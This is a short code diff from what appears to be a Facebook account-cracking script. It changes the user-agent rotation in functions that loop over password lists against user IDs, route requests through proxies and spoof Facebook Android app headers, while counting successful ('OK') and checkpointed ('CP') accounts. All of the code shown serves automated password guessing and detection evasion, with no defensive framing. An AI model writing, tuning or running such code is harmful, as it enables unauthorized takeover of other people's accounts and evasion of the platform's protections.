@@ -404,10 +404,10 @@ def metode_reguler(user, pwx, url):
 	prox = open("data/proxy.txt","r").read().splitlines()
 	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
 	prog.advance(des)
-	redmi = open('data/opra.txt','r').read().splitlines()
-	ua = random.choice(ugen2)
+	redmi = open('data/mas.txt','r').read().splitlines()
+	ua = random.choice(redmi)
 	nokia = open('data/nokia1.txt','r').read().splitlines()
-	ua2 = random.choice(ugen)
+	ua2 = random.choice(nokia)
 	for pw in pwx:
 		try:
 			pw = pw.lower()
@@ -483,10 +483,10 @@ def metode_validate(user, pwx, url):
 	prox = open("data/proxy.txt","r").read().splitlines()
 	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
 	prog.advance(des)
-	redmi = open('data/uc1.txt','r').read().splitlines()
-	ua = random.choice(ugen2)
+	redmi = open('data/mas.txt','r').read().splitlines()
+	ua = random.choice(redmi)
 	nokia = open('data/nokia1.txt','r').read().splitlines()
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(nokia)
 	for pw in pwx:
 		try:
 			pw = pw.lower()
@@ -495,7 +495,7 @@ def metode_validate(user, pwx, url):
 			headers1= {
 				"Host":url,
 				"upgrade-insecure-requests":"1",
-				"user-agent":ua,
+				"user-agent":ua2,
 				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
 				"x-requested-with":"com.facebook.katana",
 				"sec-fetch-site":"same-origin",
